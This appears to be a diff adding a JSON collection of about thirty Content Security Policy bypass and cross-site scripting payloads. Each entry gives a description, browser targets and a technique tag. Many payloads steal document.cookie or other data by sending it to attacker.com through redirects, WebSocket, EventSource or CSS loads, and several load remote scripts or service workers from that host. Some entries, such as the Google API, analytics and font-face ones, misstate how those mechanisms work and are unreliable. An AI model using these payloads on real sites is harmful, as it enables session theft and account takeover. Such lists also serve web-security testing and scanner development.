@@ -1,0 +1,221 @@
+[
+  {
+    "description": "CSP bypass via base-uri directive missing - inject base tag to rewrite relative URLs",
+    "code": "<base href=\"//attacker.com/\">\n<script src=/script.js></script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "base-uri"
+  },
+  {
+    "description": "CSP bypass via form-action missing - submit form to external domain",
+    "code": "<form action=\"//attacker.com/steal\">\n<input name=\"token\" value=\"\">\n</form>\n<script>document.forms[0].submit()</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "form-action"
+  },
+  {
+    "description": "CSP bypass via frame-src with * - inject iframe with data URL",
+    "code": "<iframe src=\"data:text/html,<script>parent.postMessage(document.cookie,'*')</script>\"></iframe>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "frame-src-wildcard"
+  },
+  {
+    "description": "CSP bypass via JSONP endpoint on allowed domain - Google APIs",
+    "code": "<script src=\"https://apis.google.com/js/api.js\"></script>\n<script>google.load('search', '1', {'callback': function() { google.search.ha.a5f({}, window.location='//attacker.com/?c='+document.cookie) }})</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "jsonp"
+  },
+  {
+    "description": "CSP bypass via AngularJS template injection when CSP prevents {{constructor}}",
+    "code": "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "angularjs-csp"
+  },
+  {
+    "description": "CSP bypass using base tag with javascript protocol",
+    "code": "<base href=\"javascript:alert(1)//\">\n<a href=xss>XSS</a>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "base-javascript"
+  },
+  {
+    "description": "CSP bypass via missing script-src - inline event handler",
+    "code": "<div onmouseover=alert(1)>XSS</div>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass_note": "Works when CSP only has style-src or img-src, no script-src"
+  },
+  {
+    "description": "CSP bypass using google-analytics.com as trusted script source for data exfil",
+    "code": "<script src=\"https://www.google-analytics.com/analytics.js\"></script>\n<script>ga('set','page','//attacker.com/?c='+document.cookie);ga('send','pageview')</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "analytics-abuse"
+  },
+  {
+    "description": "CSP bypass using eval() via JSONP on allowed CDN",
+    "code": "<script src=\"https://cdn.jsdelivr.net/npm/jsonp@0.0.4/dist/jsonp.min.js\"></script>\n<script>jsonp({url:'//attacker.com/?c='+document.cookie})</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "cdn-abuse"
+  },
+  {
+    "description": "CSP bypass via missing object-src - embed flash/swf",
+    "code": "<object type=\"application/x-shockwave-flash\" data=\"//attacker.com/xss.swf?js=alert(1)\"></object>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass_note": "Works when CSP has no object-src or object-src *",
+    "technique": "object-src"
+  },
+  {
+    "description": "CSP bypass via data: URI in script-src - base64 encoded XSS",
+    "code": "<script src=\"data:text/javascript;base64,YWxlcnQoMSk=\"></script>",
+    "browsers": ["chrome", "firefox"],
+    "csp_bypass": true,
+    "technique": "data-uri"
+  },
+  {
+    "description": "CSP bypass using blob: URI in script-src",
+    "code": "<script>\nvar b = new Blob(['alert(1)'], {type: 'text/javascript'});\nvar u = URL.createObjectURL(b);\nvar s = document.createElement('script');\ns.src = u;\ndocument.body.appendChild(s);\n</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "blob-uri"
+  },
+  {
+    "description": "CSP bypass using utf-7 encoding if charset not locked",
+    "code": "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-7\">\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
+    "browsers": ["ie", "edge"],
+    "csp_bypass": true,
+    "technique": "utf7-encoding"
+  },
+  {
+    "description": "CSP bypass via report-uri endpoint with open redirect to external",
+    "code": "<script src=\"/nonexistent.js\" nonce=\"invalid\"></script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass_note": "Requires report-uri endpoint with open redirect in CSP violation report"
+  },
+  {
+    "description": "CSP bypass using style-injection with @import to leak data",
+    "code": "<style>\n@import url(\"https://attacker.com/?data=\")\n</style>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "style-import",
+    "note": "Requires missing style-src CSP or googleapis.com in style-src"
+  },
+  {
+    "description": "CSP bypass via base tag with // protocol",
+    "code": "<base href=//attacker.com/>\n<script src=//injected></script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "base-protocol"
+  },
+  {
+    "description": "CSP bypass using link preload with script type",
+    "code": "<link rel=\"preload\" href=\"//attacker.com/payload.js\" as=\"script\">",
+    "browsers": ["chrome"],
+    "csp_bypass_note": "Works when CSP has relaxed script-src"
+  },
+  {
+    "description": "CSP bypass using service worker registration",
+    "code": "<script>\nif ('serviceWorker' in navigator) {\n  navigator.serviceWorker.register('//attacker.com/sw.js');\n}\n</script>",
+    "browsers": ["chrome", "firefox"],
+    "csp_bypass": true,
+    "technique": "service-worker",
+    "note": "Requires script-src to include the worker domain"
+  },
+  {
+    "description": "CSP bypass via Web Worker importScripts with data URI",
+    "code": "<script>\nvar w = new Worker('data:text/javascript,importScripts(\"//attacker.com/payload.js\")');\n</script>",
+    "browsers": ["chrome", "firefox"],
+    "csp_bypass": true,
+    "technique": "web-worker"
+  },
+  {
+    "description": "CSP bypass using XHR to allowed domain then eval response",
+    "code": "<script>\nvar x = new XMLHttpRequest();\nx.open('GET', 'https://allowed.com/api', true);\nx.onload = function() { eval(x.responseText); };\nx.send();\n</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass_note": "Requires XHR/fetch to allowed domain returning user-controlled data"
+  },
+  {
+    "description": "CSP bypass via importScripts in worker scope on allowed origin",
+    "code": "<script>\nvar blob = new Blob(['importScripts(\"https://trusted.com/file.js\")'], {type: 'text/javascript'});\nvar url = URL.createObjectURL(blob);\nvar worker = new Worker(url);\n</script>",
+    "browsers": ["chrome", "firefox"],
+    "csp_bypass": true,
+    "technique": "worker-import"
+  },
+  {
+    "description": "CSP bypass using Google Fonts CSS with open redirect",
+    "code": "<link href=\"https://fonts.googleapis.com/css?family=roboto\" rel=\"stylesheet\">\n<!-- If googleapis.com in style-src, abuse @font-face to load external resources -->\n<style>@font-face{font-family:x;src:url('https://attacker.com/?data='+document.domain)}</style>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "fonts-css"
+  },
+  {
+    "description": "CSP bypass via document.write with dynamically created script",
+    "code": "<script>\ndocument.write('<scr'+'ipt src=https://attacker.com/payload.js></scr'+'ipt>');\n</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass_note": "Works when CSP is misconfigured or missing"
+  },
+  {
+    "description": "CSP bypass using inline style attribute with CSS expression (IE)",
+    "code": "<div style=\"width:expression(alert(1))\"></div>",
+    "browsers": ["ie"],
+    "csp_bypass": true,
+    "technique": "css-expression"
+  },
+  {
+    "description": "CSP bypass using meta http-equiv refresh with javascript URL",
+    "code": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
+    "browsers": ["ie"],
+    "csp_bypass": true,
+    "technique": "meta-refresh"
+  },
+  {
+    "description": "CSP bypass using link rel=import with allowed domain",
+    "code": "<link rel=\"import\" href=\"https://allowed.com/template.html\">",
+    "browsers": ["chrome", "edge"],
+    "csp_bypass_note": "HTML Imports are deprecated but still work in older Chrome/Edge"
+  },
+  {
+    "description": "CSP bypass using WebSocket to exfiltrate data",
+    "code": "<script>\nvar ws = new WebSocket('wss://attacker.com');\nws.onopen = function() { ws.send(document.cookie); };\n</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass_note": "Requires missing connect-src CSP",
+    "technique": "websocket"
+  },
+  {
+    "description": "CSP bypass using EventSource to exfiltrate data",
+    "code": "<script>\nvar e = new EventSource('https://attacker.com/?c='+document.cookie);\n</script>",
+    "browsers": ["chrome", "firefox"],
+    "csp_bypass_note": "Requires missing connect-src CSP",
+    "technique": "eventsource"
+  },
+  {
+    "description": "CSP bypass using fetch to allowed domain then inject via open redirect",
+    "code": "<script>\nfetch('https://allowed.com/redirect?next='+encodeURIComponent('<script src=//attacker.com/payload.js><\/script>'))\n.then(r => r.text())\n.then(t => { document.open(); document.write(t); document.close(); });\n</script>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass": true,
+    "technique": "fetch-open-redirect"
+  },
+  {
+    "description": "CSP bypass using svg animation to load external resource",
+    "code": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+    "browsers": ["chrome", "firefox", "safari"],
+    "csp_bypass_note": "SVG elements can sometimes bypass strict CSP in certain configurations"
+  },
+  {
+    "description": "CSP bypass using object tag with data URI",
+    "code": "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
+    "browsers": ["chrome", "firefox", "edge", "safari"],
+    "csp_bypass_note": "Requires missing object-src or data: in object-src",
+    "technique": "object-data"
+  },
+  {
+    "description": "CSP bypass using xml-stylesheet processing instruction",
+    "code": "<?xml-stylesheet type=\"text/xsl\" href=\"//attacker.com/steal.xsl\"?>",
+    "browsers": ["ie", "edge"],
+    "csp_bypass": true,
+    "technique": "xslt-stylesheet"
+  }
+]
